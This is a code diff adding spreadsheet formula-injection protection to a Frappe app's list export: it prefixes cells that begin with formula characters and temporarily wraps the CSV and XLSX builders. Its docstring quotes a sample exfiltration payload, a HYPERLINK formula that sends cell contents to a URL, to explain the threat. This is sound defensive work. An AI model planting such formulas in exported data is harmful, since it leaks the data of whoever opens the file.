@@ -35,6 +35,8 @@ was, with the one substitution native would have made.
 Plan + the hardline rules: docs/plans/tasks-ui/2026-07-30-derived-fields-list-engine.md
 """
 
+from contextlib import contextmanager
+
 import frappe
 
 from tatva_connect.list_engine import derived
@@ -42,6 +44,51 @@ from tatva_connect.list_engine.engine import ListRequest
 
 # What frappe's own `max_report_rows` field defaults to, for a site that has never set it.
 DEFAULT_ROW_CAP = 100_000
+
+# A cell beginning with any of these is EXECUTED by Excel, LibreOffice and Sheets, not displayed.
+_FORMULA_LEADS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _as_text(value):
+	"""Prefix a formula-leading cell with an apostrophe: every spreadsheet reads the rest as text."""
+	if isinstance(value, str) and value.startswith(_FORMULA_LEADS):
+		return "'" + value
+	return value
+
+
+@contextmanager
+def _cells_are_never_formulas():
+	"""Neutralise formula-leading cells in BOTH export formats, for the duration of one export.
+
+	`title` on a lead or a task is free text a partner or a rep supplies, and nothing on the way in or the
+	way out treats it as dangerous — frappe has no formula guard anywhere (`csvutils`, `xlsxutils` and
+	`reportview` were all checked). So `=HYPERLINK("http://…"&A1)` in a name is inert in the CRM and runs
+	the moment a manager opens the export. The payload carries no `<`, so the HTML sanitiser never sees it.
+
+	THE WRAP IS THE SEAM, because `_export_query` has no other. It goes from `DatabaseQuery.execute` to
+	finished bytes inside one function, and its only early exit hands back the encoded file. Sanitising
+	bytes would mean re-parsing a CSV and giving up on xlsx entirely; the alternative is reimplementing the
+	export here, which the module docstring forbids for good reason. Both builders are imported INSIDE
+	`_export_query`, so rebinding them on their own modules is seen by that call and by nothing else, and
+	the original is always restored.
+	"""
+	from frappe.desk import utils as desk_utils
+	from frappe.utils import xlsxutils
+
+	native_csv, native_xlsx = desk_utils.get_csv_bytes, xlsxutils.make_xlsx
+
+	# *args/**kwargs deliberately: the wrapper touches the ROWS and nothing else, so an upstream signature change cannot silently drop an argument.
+	def safe_csv(data, *args, **kwargs):
+		return native_csv([[_as_text(v) for v in row] for row in data], *args, **kwargs)
+
+	def safe_xlsx(data, *args, **kwargs):
+		return native_xlsx([[_as_text(v) for v in row] for row in data], *args, **kwargs)
+
+	desk_utils.get_csv_bytes, xlsxutils.make_xlsx = safe_csv, safe_xlsx
+	try:
+		yield
+	finally:
+		desk_utils.get_csv_bytes, xlsxutils.make_xlsx = native_csv, native_xlsx
 
 
 @frappe.whitelist()
@@ -65,7 +112,8 @@ def export_query():
 	# POPPED, not read — `get_form_params` leaves it in and it reached the query builder as an unknown keyword, 500ing every Desk export. Native pops it here for the same reason.
 	if frappe.cint(form_params.pop("export_in_background", 0)):
 		return reportview.export_query()
-	return reportview._export_query(form_params, csv_params)
+	with _cells_are_never_formulas():
+		return reportview._export_query(form_params, csv_params)
 
 
 @frappe.whitelist()
